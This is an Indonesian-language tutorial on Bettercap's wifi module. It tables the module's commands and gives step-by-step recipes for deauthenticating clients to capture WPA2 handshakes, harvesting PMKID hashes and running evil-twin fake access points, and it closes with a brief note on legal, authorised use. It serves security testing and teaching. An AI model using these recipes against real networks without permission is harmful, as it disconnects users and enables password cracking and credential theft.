# Modul `wifi` di Bettercap

## A. Pengertian Singkat

Modul `wifi` digunakan untuk **memantau dan menyerang jaringan Wi-Fi 802.11 secara aktif**. Modul ini mampu:
- Menemukan [access point](https://netmonk.id/blog/pengertian-access-point) dan [klien](https://www.liputan6.com/hot/read/5341870/client-adalah-perangkat-yang-terhubung-dengan-server-kenali-fungsinya)
- Melakukan serangan [deauth](https://en.wikipedia.org/wiki/Wi-Fi_deauthentication_attack), [fake AP](https://en.wikipedia.org/wiki/Fake_AP), dan [PMKID harvesting](https://www.nccgroup.com/us/research-blog/pmkid-attacks-debunking-the-80211r-myth/)
- Melakukan [channel hopping](https://en.wikipedia.org/wiki/Channel_hopping) untuk menangkap semua **jaringan**
- Menciptakan [evil twin access point](https://www.anakteknik.co.id/bayurahmadi/articles/evil-twin-attack-ancaman-serangan-pada-jaringan-wifi) untuk [social engineering](https://widyasecurity.com/2021/12/20/cyber-attack-social-engineering-dan-tips-menghadapinya/) atau **testing keamanan**

## B. Perintah Dasar

| Perintah | Fungsi |
|:--:|:--:|
| `wifi.recon on` | Mengaktifkan **pemindaian jaringan Wi-Fi** + **channel hopping** |
| `wifi.recon off` | Menonaktifkan **pemindaian jaringan** |
| `wifi.clear` | Menghapus daftar **access point** yang **ditemukan** |
| `wifi.recon MAC` | Filter hanya untuk **satu AP** berdasarkan [MAC](https://it.telkomuniversity.ac.id/mac-address-adalah/) |
| `wifi.recon clear` | Hapus filter **AP** |
| `wifi.show` | Tampilkan daftar **access point** |
| `wifi.show.wps BSSID` | Tampilkan info [WPS](https://rexus.id/blogs/tips/wps) dari **AP** |
| `wifi.recon.channel CH` | Atur **channel Wi-Fi** (pisahkan dengan koma) atau `clear` untuk **hopping** |

## C. Serangan Wireless

| Perintah | Fungsi |
|:--:|:--:|
| `wifi.deauth BSSID` | Serangan **deauthentication** untuk **memutus klien** dari **AP** |
| `wifi.assoc BSSID` | Kirim request **asosiasi** ke **AP** untuk mengambil **PMKID** |
| `wifi.ap` | Buat **access point palsu** (evil twin) |
| `wifi.fake_auth bssid client` | Kirim **fake auth frame** agar **klien terputus** |
| `wifi.probe BSSID ESSID` | Kirim **probe request palsu** |
| `wifi.channel_switch_announce BSSID channel` | Paksa **klien pindah channel** dan **terputus** |

## D. Parameter Penting

| Parameter	| Fungsi | Default |
|:--:|:--:|:--:|
| `wifi.interface` | Gunakan **interface tertentu** (misalnya `wlan0mon`)	| (otomatis) |
| `wifi.ap.ssid` | [SSID](https://id.wikipedia.org/wiki/Service_set_identifier) untuk **access point palsu** | `FreeWiFi` |
| `wifi.ap.encryption` | Gunakan [WPA2](https://id.wikipedia.org/wiki/Akses_Perlindungan_Wi-Fi) untuk **AP palsu** | `true` |
| `wifi.ap.channel` | [Channel](https://alcatelkomunikasi.com/pentingnya-mengatur-channel-pada-wifi) untuk **AP palsu** | `1` |
| `wifi.handshakes.file` | Lokasi file untuk menyimpan [handshakes](https://binus.ac.id/malang/2020/07/pentingnya-proses-handshake-pada-pemrograman-pada-jaringan/) | `~/bettercap-wifi-handshakes.pcap` |
| `wifi.txpower` | Set daya pemancar [Wi-Fi](https://id.wikipedia.org/wiki/Wi-Fi) (`mW`) | `30` |
| `wifi.rssi.min` | Batas minimum **sinyal** (`-dBm`) untuk ditampilkan | `-200` |
| `wifi.show.sort` | Urutan output `wifi.show` (misal `rssi desc`) | `rssi asc` |


## E. Contoh Penggunaan

### 1. Pindai Semua Jaringan Wi-Fi

```
wifi.recon on
```

### 2. Capture 4-Way Handshake

```
set wifi.handshakes.file <lokasi_simpan>
set wifi.handshakes.aggregate true
wifi.recon on
wifi.recon.channel <Channel_WiFi>
wifi.show
wifi.deauth <BSSID_WiFi>

# Kalo mau single client/target
wifi.deauth <MAC_Client> <BSSID_WiFi>
```

> **Catatan**: Kalo mau kustom lokasi simpan hasil capture 4-Way Handshake-nya jangan jalankan `wifi.recon on` dulu, tapi seting dulu `set wifi.handshakes.file <lokasi_simpan>`, terus baru `wifi.reco on`. Samakan saja seperti contoh diatas.


### 3. Buat Access Point Palsu

1. Tanpa Password:

   ```
   set wifi.ap.ssid <SSID_WiFi>
   set wifi.ap.encryption false
   wifi.ap
   ```

2. Menggunakan Password:

   ```
   set wifi.ap.ssid <SSID_WiFi>
   set wifi.ap.encryption wpa2
   set wifi.ap.key <password>
   wifi.ap
   ```

### 4. Capture PMKID WPA2 Hash

```
set wifi.handshakes.file <lokasi_simpan>
set wifi.handshakes.aggregate true
wifi.recon on
wifi.recon.channel <channel_WiFi>
wifi.show
wifi.assoc <BSSID_WiFi>
```

> **Catatan**: Kalo mau kustom lokasi simpan hasil capture PMKID WPA2 Hash-nya jangan jalankan `wifi.recon on` dulu, tapi seting dulu `set wifi.handshakes.file <lokasi_simpan>`, terus baru `wifi.reco on`. Samakan saja seperti contoh diatas.

### F. Fitur Advanced Filtering

| Perintah | Fungsi |
|:--:|:--:|
| `wifi.client.probe.sta.filter REGEX` | Filter berdasarkan **MAC klien** |
| `wifi.client.probe.ap.filter REGEX` | Filter berdasarkan **nama AP** |
| `wifi.show.filter REGEX` | Filter hasil `wifi.show` |
| `wifi.show.limit` | Batasi jumlah **AP** yang **ditampilkan** |
| `wifi.show.manufacturer true` | Tampilkan **vendor perangkat** |

## G. Etika & Keamanan
- Gunakan hanya untuk **pengujian legal**, **lab pribadi**, atau **dengan izin**.
- Serangan **deauth**, **PMKID**, **fake auth**, **dll** bersifat **destruktif**.
- Hindari serangan terhadap **jaringan publik tanpa izin**, karena bisa **melanggar hukum**.

## H. Kesimpulan

Modul `wifi` di [Bettercap](https://www.bettercap.org/) adalah alat lengkap untuk [recon](https://www.proweb.co.id/articles/ethical-hacking/jenis-intai.html) dan serangan nirkabel [802.11](https://id.wikipedia.org/wiki/IEEE_802.11). Dari scanning **pasif** hingga **eksploitasi aktif** seperti **deauth** dan **evil twin**, modul ini dapat digunakan untuk:
- Audit keamanan **jaringan Wi-Fi**
- Simulasi **serangan** untuk **edukasi**
- Pengujian **perangkat wireless** dan **proteksi**
